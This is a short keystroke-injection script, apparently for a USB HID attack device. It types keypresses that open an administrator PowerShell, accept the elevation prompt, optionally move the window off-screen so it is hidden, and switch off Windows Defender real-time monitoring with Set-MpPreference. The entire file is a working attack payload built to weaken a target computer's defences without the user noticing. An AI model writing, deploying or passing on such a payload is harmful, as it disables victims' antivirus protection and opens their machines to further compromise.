function fast() {  
  	typingSpeed(0,0) //sets typing speed as fast as possible with no randomness
}

function startPS() { //starts powershell (if fails on slower computers extend the delays and see if that helps)
	press("GUI x");
	delay(50);
	press("a");
	delay(500);
	press("LEFT");
	delay(50);
	press("ENTER");
	delay(200);
}

function hidePS() { //moves powershell window far outside of screeen coords but keeps window in focus to allow typing off screen
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

function disableAV() { //disables windows defender real time monitoring
	type('Set-MpPreference -DisableRealtimeMonitoring $true')
	press("ENTER");
	delay(200);
}

function exitPS() { //exits Powershell
	type("exit")
	press("ENTER");
}

layout('us');
fast();
startPS();
//hidePS();
disableAV();
exitPS();
